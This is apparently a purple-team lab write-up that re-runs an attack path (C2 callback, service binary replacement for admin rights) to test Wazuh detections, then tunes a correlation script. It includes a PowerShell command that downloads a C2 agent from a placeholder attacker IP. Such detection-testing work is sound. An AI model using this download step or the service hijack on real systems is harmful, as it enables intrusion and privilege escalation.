---
layout: default
title: "Red Team Re-Engage For Level - Testing All Detecti"
permalink: /solo-purple-teaming/red-team-re-engage-for-level-testing-all-detecti/
---

<link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">

<div class="spt-page">
<a class="spt-back" href="/solo-purple-teaming/">← Back to Solo Purple Teaming</a>
<section class="spt-hero">
<p class="spt-kicker">Solo Purple Teaming</p>
<h1>Red Team Re-Engage For Level - Testing All Detecti</h1>
</section>
<section class="spt-content">

# Red Team Re-Engage For Level - Testing All Detections

Owner: Mike Sterrett

### **1. Purpose of Reengagement**

- **Why we do it:**
    - Validate detection improvements after the first round of testing.
    - Confirm correlation rules actually work in practice.
    - Identify issues such as typos, missed alerts, or non-triggered correlations.
- **Benefits:**
    - Surfaces hidden bugs.
    - Encourages review of lessons learned.
    - Improves detection maturity and resilience.

---

### **2. Starting Fresh**

- Logged into **Wazuh Manager** → Solo Purple Teaming dashboard.
- Time range set to **last 15 minutes** – no alerts are present.
- Checked **Mythic** – no callbacks present.
- On the **assumed breached host**, reset environment:
    - Deleted **Apollo agent**.
    - Restored `ecoin sync` to original state.
- Goal: Reenact **Attack Path Level Zero** from scratch.

---

### **3. Initial Access**

1. Execute initial access payload.
2. **Verify callback** in Mythic – success.
3. Interact with the callback:
    - Run `whoami /priv` → View privileges (nothing special).
    - Check **local administrators group** membership → Service account present.
4. Enumerate services:
    - Found `ecoin sync` service running as `SVC_ecoin_sync` (local admin account).
    - Located binary on **desktop** → accessible to current user.

---

### **4. Service Abuse Setup**

1. **Check service permissions** with security descriptor:
    - Found SID that can start/stop service.
    - Matched SID to current user (`arlin`) → confirms control over service.
2. **Prepare payloads**:
    - Pull **Apollo agent** using PowerShell:
        
        ```powershell
        Invoke-WebRequest -Uri http://<attacker_ip>:8000/apollo.exe -OutFile Downloads\apollo.exe
        
        ```
        
    - Verify file in `Downloads`.
3. **Replace service binary**:
    - Rename original `ecoin sync` binary to `.bak`.
    - Download service wrapper (prebuilt from previous engagement).
    - Verify service wrapper on desktop.

---

### **5. Payload Execution**

1. Start the modified service.
2. **Get new callback**:
    - Callback is **high integrity** → running as administrator.
3. OPSEC maintained throughout the operation.

---

### **6. Detection Review**

- Back in Wazuh dashboard:
    - Alerts: 3 critical, 3 high, 5 medium.
    - **Reflection detection** fired.
    - **Time-based correlation** fired.
    - **Advanced correlation (possible C2)** **did NOT fire**.

---

### **7. Troubleshooting Advanced Correlation Engine**

1. Tailing `correlation.json` showed no alerts.
2. Edited `waza_ace.py` script:
    - Adjusted log reading frequency from `0.75` seconds to `0.25` seconds.
3. Restarted service:
    
    ```bash
    sudo systemctl restart waza-ace
    
    ```
    
4. Re-ran initial access payload.
5. This time:
    - Correlation alerts triggered (including **possible C2 activity**).
    - Issue likely due to file reading delay or log push timing.

---

### **8. Lessons for Solo Purple Teamers**

- Custom tools (like the advanced correlation engine) require **constant tuning**.
- Consider alternative file monitoring methods for reliability.
- Share improvements with the community (e.g., Discord).
- Always **run reengagements** before moving on to next attack path level:
    - See which detections fire.
    - Identify missed detections.
    - Plan improvements.

---

### **9. Next Steps**

- Moving to **Attack Path Level One**:
    - Expands the Level Zero attack path.
    - Demonstrates how brittle detections can be.
    - Shows bypass techniques.
    - Purposefully weak rules from Level Zero will be tested and broken.

</section>
</div>
